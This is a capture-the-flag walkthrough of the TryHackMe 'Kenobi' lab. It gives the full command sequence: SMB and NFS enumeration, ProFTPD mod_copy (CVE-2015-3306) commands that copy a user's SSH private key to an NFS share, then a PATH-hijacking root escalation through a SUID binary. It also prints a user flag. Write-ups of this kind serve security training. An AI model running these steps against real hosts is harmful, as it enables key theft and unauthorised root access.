---
title: "Kenobi"
description: "A beginner-friendly boot2root machine combining SMB enumeration, ProFTPD mod_copy exploitation (CVE-2015-3306), NFS mounting, and PATH hijacking via a SUID menu binary for privilege escalation."
difficulty: "Easy"
tags: ["SMB", "ProFTPD", "CVE-2015-3306", "NFS", "SUID", "PATH Hijacking", "GTFOBins"]
date: "2026-07-24"
---

## Overview

Kenobi is a TryHackMe room focused on core penetration testing techniques including SMB enumeration, exploiting ProFTPD's mod_copy module to copy files without authentication, mounting NFS shares to retrieve stolen keys, and escalating privileges through a SUID binary that trusts the PATH environment variable. The room demonstrates how small misconfigurations chain together for a full compromise.

## Room Information

- **Platform:** TryHackMe
- **Difficulty:** Easy
- **Skills Learned:** SMB enumeration, ProFTPD mod_copy exploitation (CVE-2015-3306), NFS mounting, SUID privilege escalation via PATH hijacking

## Enumeration

### Nmap Scan

```bash
nmap -sV -sC -oN nmap.txt <target-ip>
```

![Nmap scan results](/assets/screenshots/kenobi/nmap.png)

The scan revealed seven open ports:

| Port | Service | Version |
|------|---------|---------|
| 21/tcp | FTP | ProFTPD 1.3.5 |
| 22/tcp | SSH | OpenSSH 8.2p1 Ubuntu |
| 80/tcp | HTTP | Apache httpd 2.4.41 |
| 111/tcp | rpcbind | 2-4 (RPC #100000) |
| 139/tcp | SMB | Samba smbd 4 |
| 445/tcp | SMB | Samba smbd 4 |
| 2049/tcp | NFS | 3-4 (RPC #100003) |

Multiple file-sharing services were exposed: SMB for Windows-style sharing, NFS for Unix-style sharing, and ProFTPD for FTP access.

### SMB Share Enumeration

Samba shares were enumerated using `smbclient`. Three shares were found:

```bash
smbclient -L //<target-ip> -N
```

![SMB share enumeration](/assets/screenshots/kenobi/smb_unauth.png)

The `anonymous` share was accessible without credentials. Connecting to it revealed a single file:

```bash
smbclient //<target-ip>/anonymous -N
```

![Accessing the anonymous SMB share](/assets/screenshots/kenobi/smb_get_log.png)

The `log.txt` file contained critical information: it documented the generation of an SSH RSA key pair for the `kenobi` user and showed the ProFTPD configuration, including that FTP runs as the `kenobi` user.

### NFS Enumeration

Port 111 was running rpcbind, which maps RPC services to their ports. The NFS service was enumerated to find mountable exports:

```bash
nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount <target-ip>
```

![Finding the NFS share location from log.txt](/assets/screenshots/kenobi/key_location.png)

The `/var` directory was mountable via NFS. The log.txt file also showed the anonymous share path was `/home/kenobi/share`:

![Anonymous share path in log.txt](/assets/screenshots/kenobi/share_info.png)

## Initial Access — ProFTPD mod_copy Exploitation

### CVE-2015-3306

ProFTPD 1.3.5 includes a `mod_copy` module that implements `SITE CPFR` and `SITE CPTO` commands. These commands allow copying files on the server from one location to another — and critically, they work without authentication.

Checking for available exploits:

```bash
searchsploit proftpd 1.3.5
```

![Searchsploit results for ProFTPD 1.3.5](/assets/screenshots/kenobi/searchsploit.png)

The attack plan was: copy kenobi's SSH private key to a location accessible via the NFS mount (/var/tmp), then mount the NFS share and retrieve it.

Connected to the FTP server and issued the copy commands:

```bash
nc <target-ip> 21
SITE CPFR /home/kenobi/.ssh/id_rsa
SITE CPTO /var/tmp/id_rsa
```

![Exploiting mod_copy to copy the SSH private key](/assets/screenshots/kenobi/cve_2015_3306.png)

### Mounting NFS and Retrieving the Key

```bash
mkdir /mnt/kenobi_nfs
mount <target-ip>:/var /mnt/kenobi_nfs
cp /mnt/kenobi_nfs/tmp/id_rsa .
```

Set the correct permissions and logged in via SSH:

```bash
chmod 600 id_rsa
ssh -i id_rsa kenobi@<target-ip>
```

![SSH login as kenobi](/assets/screenshots/kenobi/ssh.png)

### User Flag

```bash
cat /home/kenobi/user.txt
```

## Privilege Escalation

### Finding the SUID Binary

Checked for SUID binaries — files that execute with the file owner's privileges regardless of who runs them:

```bash
find / -perm -u=s -type f 2>/dev/null
```

![Finding SUID binaries on the system](/assets/screenshots/kenobi/find_suid.png)

The binary `/usr/bin/menu` stood out as a non-standard SUID binary owned by root.

### Analyzing /usr/bin/menu

Running the binary presented three options. The `strings` command revealed what it does:

```bash
strings /usr/bin/menu
```

![Strings output showing the commands called by menu](/assets/screenshots/kenobi/menu_strings.png)

The binary executed `curl`, `uname -r`, and `ifconfig` — but notice it called `curl` without a full path like `/usr/bin/curl`. This is a critical flaw.

### PATH Hijacking

When `menu` calls `curl`, the shell searches the directories listed in the `PATH` environment variable in order. The PATH contained `/home/kenobi/bin` as the first entry:

![PATH environment variable](/assets/screenshots/kenobi/path_var.png)

By creating a fake `curl` script in `/home/kenobi/bin` that executes `/bin/bash`, and making sure that directory appears first in PATH, the SUID `menu` binary will execute our code as root:

```bash
mkdir /home/kenobi/bin
echo "/bin/bash" > /home/kenobi/bin/curl
chmod +x /home/kenobi/bin/curl
export PATH=/home/kenobi/bin:$PATH
/usr/bin/menu
```

Selecting option 1 (which runs curl) spawns a root shell:

![Privilege escalation via PATH hijacking](/assets/screenshots/kenobi/escalate.png)

### Root Flag

```bash
cat /root/root.txt
```

## Flags

| Flag | Location | Value |
|------|----------|-------|
| User | `/home/kenobi/user.txt` | `d0b0f3f53b6caa532a83915e19224899` |
| Root | `/root/root.txt` | — |

## Commands Used

```bash
# Nmap scan
nmap -sV -sC -oN nmap.txt <target-ip>

# SMB enumeration
smbclient -L //<target-ip> -N
smbclient //<target-ip>/anonymous -N
get log.txt

# NFS enumeration
nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount <target-ip>

# ProFTPD exploitation (CVE-2015-3306)
nc <target-ip> 21
SITE CPFR /home/kenobi/.ssh/id_rsa
SITE CPTO /var/tmp/id_rsa

# Mount NFS and retrieve key
mkdir /mnt/kenobi_nfs
mount <target-ip>:/var /mnt/kenobi_nfs
cp /mnt/kenobi_nfs/tmp/id_rsa .
chmod 600 id_rsa

# SSH access
ssh -i id_rsa kenobi@<target-ip>

# User flag
cat /home/kenobi/user.txt

# Find SUID binaries
find / -perm -u=s -type f 2>/dev/null

# Analyze the menu binary
strings /usr/bin/menu

# PATH hijacking
mkdir /home/kenobi/bin
echo "/bin/bash" > /home/kenobi/bin/curl
chmod +x /home/kenobi/bin/curl
export PATH=/home/kenobi/bin:$PATH
/usr/bin/menu
# Select option 1 to get a root shell
cat /root/root.txt
```

## Lessons Learned

- **SMB anonymous shares are a common information leak.** The `anonymous` share required no credentials and exposed a log file containing SSH key paths and service configuration. Always check for null-session access on SMB during reconnaissance.
- **NFS exports without restriction expose sensitive files.** The `/var` directory was mountable by any host without authentication. Combined with the ProFTPD vulnerability, this allowed retrieving the copied SSH private key from `/var/tmp`.
- **CVE-2015-3306 demonstrates the danger of file copy capabilities without auth.** ProFTPD's `mod_copy` module allows unauthenticated users to copy files anywhere on the filesystem. This single feature, while useful for server-side operations, becomes a critical vulnerability when exposed to untrusted networks.
- **Chaining vulnerabilities is more effective than relying on a single exploit.** Neither the SMB share, the NFS mount, nor the ProFTPD vulnerability alone would have provided a complete attack path. Combined, they enabled a full system compromise.
- **SUID binaries calling commands without absolute paths are exploitable.** The `menu` binary ran `curl` using a relative reference, allowing PATH hijacking. This classic technique leverages the fact that the system searches PATH entries in order and will execute the first match.
- **Always examine SUID binaries with `strings`.** Even without reverse engineering tools, extracting readable strings reveals which external commands a binary depends on and whether full paths are used.
- **GTFOBins documents many SUID escalation techniques.** The PATH hijacking method is a well-known pattern documented on GTFOBins for various binaries.

## References

- [TryHackMe — Kenobi](https://tryhackme.com/room/kenobi)
- [CVE-2015-3306 — NVD](https://nvd.nist.gov/vuln/detail/CVE-2015-3306)
- [ProFTPD mod_copy Documentation](http://www.proftpd.org/docs/modules/mod_copy.html)
- [GTFOBins — SUID](https://gtfobins.github.io/)
- [Samba — smbclient man page](https://www.samba.org/samba/docs/current/man-html/smbclient.1.html)
- [NFS — showmount man page](https://linux.die.net/man/8/showmount)
